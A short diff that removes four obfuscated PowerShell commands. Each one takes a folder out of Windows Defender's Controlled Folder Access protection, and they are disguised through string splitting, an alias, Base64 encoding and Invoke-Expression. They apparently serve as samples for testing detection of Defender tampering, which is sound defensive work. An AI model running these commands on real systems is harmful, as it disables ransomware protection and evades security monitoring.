@@ -1,4 +1,0 @@
-powershell.exe "& { $p = @{ 'Controlled' + 'FolderAccessProtectedFolders' = 'C:\' }; Remove-MpPreference @p }"
-powershell.exe -Command "Set-Alias -Name 'RMP' -Value 'Remove-MpPreference'; RMP -ControlledFolderAccessProtectedFolders 'C:\Secret'"
-powershell.exe -EncodedCommand UmVtb3ZlLU1wUHJlZmVyZW5jZSAtQ29udHJvbGxlZEZvbGRlckFjY2Vzc1Byb3RlY3RlZEZvbGRlcnMgQzpcVGVtcA==
-powershell.exe -ExecutionPolicy Bypass -Command "$cmd = 'Remove-Mp' + 'Preference'; Invoke-Expression ($cmd + ' -ControlledFolderAccessProtectedFolders C:\Users\Public')"
